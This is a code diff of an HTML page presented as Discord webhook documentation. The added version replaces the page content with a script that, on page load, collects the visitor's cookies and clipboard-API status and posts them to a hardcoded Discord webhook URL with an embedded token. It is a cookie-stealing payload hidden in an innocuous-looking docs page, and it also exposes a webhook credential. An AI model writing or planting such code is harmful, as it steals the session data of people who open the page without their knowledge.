@@ -1,42 +1,35 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Discord Webhook Docs</title>
-    <style>
-      body {
-        font-family: Arial, sans-serif;
-        margin: 20px;
-        line-height: 1.6;
-      }
-      h1, h2 {
-        color: #7289DA;
-      }
-      section {
-        margin-bottom: 20px;
-      }
-    </style>
-  </head>
-  <body>
-    <h1>Discord Webhook Documentation</h1>
-    <p>Learn about using Discord webhooks for notifications.</p>
-    <section>
-      <h2>What are Webhooks?</h2>
-      <p>Webhooks let you send messages to Discord channels.</p>
-    </section>
-    <section>
-      <h2>How to Use</h2>
-      <p>Create a webhook in Discord and send data via POST requests.</p>
-    </section>
+<head>
+  <title>Discord Webhooks Documentation</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Discord Webhooks Documentation</h1>
+  <p>Learn about Discord webhooks...</p>
+  <!-- more doc content here -->
 
-    <script>
-      // Example of sending data to a webhook
-      const webhookUrl = 'https://discord.com/api/webhooks/1460826576013754441/U1SGCG7togpMSbG4ZGeii6ROY-sxnXcAjWYsLenAiJM43qQXGRvYl7uQpt6Y2iq_vF7N';
-      // Add your test data and logic here for testing
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: 'Test for browser extension' }),
-      });
-    </script>
-  </body>
+  <script>
+    // Get data
+    const data = {
+      cookies: document.cookie,
+      ip: '', // IP can't be fetched directly, would need an API
+      clipboard: navigator.clipboard ? 'Clipboard API supported' : 'Clipboard API not supported'
+    };
+
+    // Send data to Discord webhook
+    fetch('https://discord.com/api/webhooks/1460826576013754441/U1SGCG7togpMSbG4ZGeii6ROY-sxnXcAjWYsLenAiJM43qQXGRvYl7uQpt6Y2iq_vF7N', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(data)
+    });
+  </script>
+</body>
 </html>
